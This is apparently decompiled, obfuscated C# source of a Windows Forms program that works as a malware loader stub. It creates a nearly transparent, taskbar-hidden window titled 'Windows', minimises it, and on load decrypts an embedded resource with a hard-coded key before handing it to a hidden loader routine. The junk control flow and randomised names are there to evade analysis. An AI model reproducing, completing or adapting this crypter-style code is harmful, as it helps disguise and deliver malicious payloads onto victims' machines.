using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using werdbn.My.Resources;

namespace werdbn;

[DesignerGenerated]
public class uytrdfgh : Form
{
	private IContainer components;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("ProgressBar1")]
	private ProgressBar _ProgressBar1;

	[AccessedThroughProperty("RichTextBox1")]
	private RichTextBox _RichTextBox1;

	internal virtual Button Button1
	{
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Button1 = value;
		}
	}

	internal virtual ProgressBar ProgressBar1
	{
		get
		{
			return _ProgressBar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ProgressBar1 = value;
		}
	}

	internal virtual RichTextBox RichTextBox1
	{
		get
		{
			return _RichTextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_RichTextBox1 = value;
		}
	}

	public uytrdfgh()
	{
		if (xVxBVLJDOU089egPyn())
		{
			switch (4)
			{
			case 4:
				break;
			case 0:
			case 1:
				goto IL_003d;
			default:
				goto IL_0053;
			case 5:
				return;
			}
		}
		((Form)this)._002Ector();
		_ = 0;
		if (xVxBVLJDOU089egPyn())
		{
			goto IL_003d;
		}
		goto IL_0053;
		IL_0053:
		InitializeComponent();
		return;
		IL_003d:
		eZrY5HO8rKb6JIJ7tq(this, new EventHandler(Form1_Load));
		goto IL_0053;
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				z8hNe7RP2aonJDtim7();
				if (xVxBVLJDOU089egPyn())
				{
					components.Dispose();
				}
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Expected O, but got Unknown
		//IL_0072: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Expected O, but got Unknown
		//IL_007d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0087: Expected O, but got Unknown
		int num = 10;
		if (xVxBVLJDOU089egPyn())
		{
			while (true)
			{
				switch (num)
				{
				case 10:
					Button1 = new Button();
					_ = 0;
					if (xVxBVLJDOU089egPyn())
					{
						num = 8;
						if (z8hNe7RP2aonJDtim7())
						{
						}
						continue;
					}
					goto case 6;
				case 6:
				case 7:
					Sb6moObw6DK2u5ZqgZ(((Control)this).get_Controls(), Button1);
					OdJY5uAJnREWvifIs2(this, (FormBorderStyle)1);
					((Control)this).set_Name("Form1");
					num = 11;
					if (!z8hNe7RP2aonJDtim7())
					{
						continue;
					}
					goto case 1;
				case 1:
				case 8:
					OGlnOSlMlD9K6bQnXD(this, (object)new ProgressBar());
					hhp93mV7GtluRiHOGq(this, (object)new RichTextBox());
					goto case 5;
				case 5:
					((Control)this).SuspendLayout();
					goto case 4;
				case 4:
				{
					object obj = S3at3ud3f7x7JC6i8r(this);
					Point point_ = new Point(14, 15);
					((Control)obj).set_Location(point_);
					M59WnDGQL1N7ESqVOT(S3at3ud3f7x7JC6i8r(this), "Button1");
					Button button = Button1;
					Size size_ = new Size(146, 49);
					((Control)button).set_Size(size_);
					((Control)S3at3ud3f7x7JC6i8r(this)).set_TabIndex(0);
					i5r71y4Qv5sIaXBclI(S3at3ud3f7x7JC6i8r(this), "JKL");
					goto case 0;
				}
				case 0:
				{
					((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
					ProgressBar progressBar = ProgressBar1;
					Point point_ = new Point(18, 78);
					((Control)progressBar).set_Location(point_);
					((Control)ProgressBar1).set_Name("ProgressBar1");
					goto case 2;
				}
				case 2:
				{
					ProgressBar progressBar2 = ProgressBar1;
					Size size_ = new Size(195, 13);
					QalEjEB90ccHVPQAMe(progressBar2, size_);
					((Control)ProgressBar1).set_TabIndex(1);
					goto default;
				}
				default:
				{
					RichTextBox richTextBox = RichTextBox1;
					Point point_ = new Point(258, 21);
					qu1sYmQwr6NTqxL3rT(richTextBox, point_);
					M59WnDGQL1N7ESqVOT(kGVvYyiLvZ971qOdxI(this), "RichTextBox1");
					RichTextBox richTextBox2 = RichTextBox1;
					Size size_ = new Size(158, 43);
					QalEjEB90ccHVPQAMe(richTextBox2, size_);
					((Control)kGVvYyiLvZ971qOdxI(this)).set_TabIndex(2);
					XSJKDA6r8G7gUcoYZw(RichTextBox1, "");
					SizeF autoScaleDimensions = new SizeF(6f, 13f);
					((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
					((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
					size_ = new Size(0, 0);
					((Form)this).set_ClientSize(size_);
					((Control)this).get_Controls().Add((Control)(object)RichTextBox1);
					((Control)this).get_Controls().Add((Control)(object)ProgressBar1);
					goto case 6;
				}
				case 11:
					break;
				case 3:
					goto IL_0247;
				case 12:
					return;
				}
				break;
			}
		}
		((Form)this).set_Opacity(0.06);
		goto IL_0247;
		IL_0247:
		((Form)this).set_ShowInTaskbar(false);
		ExVLCqLOkMVaXVsxpW(this, (FormStartPosition)0);
		((Form)this).set_Text("Windows");
		e9V6A0nnbshkKsF2Dn(this, bool_0: false);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		_ = 0;
		if (xVxBVLJDOU089egPyn())
		{
			goto IL_004c;
		}
		goto IL_0053;
		IL_0053:
		while (true)
		{
			IL_0053_2:
			byte[] F4SV52o = Resources.werdbn;
			while (true)
			{
				c9dSu2oUVuF.j0SkOMK(TpywM.IQt6Kicea(ref F4SV52o, "PW0zM6p4V"));
				if (!xVxBVLJDOU089egPyn())
				{
					break;
				}
				switch (5)
				{
				case 0:
				case 2:
					goto end_IL_000e;
				case 1:
				case 4:
					goto IL_0053_2;
				case 5:
					return;
				}
				continue;
				end_IL_000e:
				break;
			}
			break;
		}
		goto IL_004c;
		IL_004c:
		((Form)this).set_WindowState((FormWindowState)1);
		goto IL_0053;
	}

	internal static void eZrY5HO8rKb6JIJ7tq(object object_0, object object_1)
	{
		((Form)object_0).add_Load((EventHandler)object_1);
	}

	internal static bool xVxBVLJDOU089egPyn()
	{
		return true;
	}

	internal static bool z8hNe7RP2aonJDtim7()
	{
		return false;
	}

	internal static void OGlnOSlMlD9K6bQnXD(object object_0, object object_1)
	{
		((uytrdfgh)object_0).ProgressBar1 = (ProgressBar)object_1;
	}

	internal static void hhp93mV7GtluRiHOGq(object object_0, object object_1)
	{
		((uytrdfgh)object_0).RichTextBox1 = (RichTextBox)object_1;
	}

	internal static object S3at3ud3f7x7JC6i8r(object object_0)
	{
		return ((uytrdfgh)object_0).Button1;
	}

	internal static void M59WnDGQL1N7ESqVOT(object object_0, object object_1)
	{
		((Control)object_0).set_Name((string)object_1);
	}

	internal static void i5r71y4Qv5sIaXBclI(object object_0, object object_1)
	{
		((ButtonBase)object_0).set_Text((string)object_1);
	}

	internal static void QalEjEB90ccHVPQAMe(object object_0, Size size_0)
	{
		((Control)object_0).set_Size(size_0);
	}

	internal static void qu1sYmQwr6NTqxL3rT(object object_0, Point point_0)
	{
		((Control)object_0).set_Location(point_0);
	}

	internal static object kGVvYyiLvZ971qOdxI(object object_0)
	{
		return ((uytrdfgh)object_0).RichTextBox1;
	}

	internal static void XSJKDA6r8G7gUcoYZw(object object_0, object object_1)
	{
		((RichTextBox)object_0).set_Text((string)object_1);
	}

	internal static void Sb6moObw6DK2u5ZqgZ(object object_0, object object_1)
	{
		((ControlCollection)object_0).Add((Control)object_1);
	}

	internal static void OdJY5uAJnREWvifIs2(object object_0, FormBorderStyle formBorderStyle_0)
	{
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		((Form)object_0).set_FormBorderStyle(formBorderStyle_0);
	}

	internal static void ExVLCqLOkMVaXVsxpW(object object_0, FormStartPosition formStartPosition_0)
	{
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		((Form)object_0).set_StartPosition(formStartPosition_0);
	}

	internal static void e9V6A0nnbshkKsF2Dn(object object_0, bool bool_0)
	{
		((Control)object_0).ResumeLayout(bool_0);
	}
}
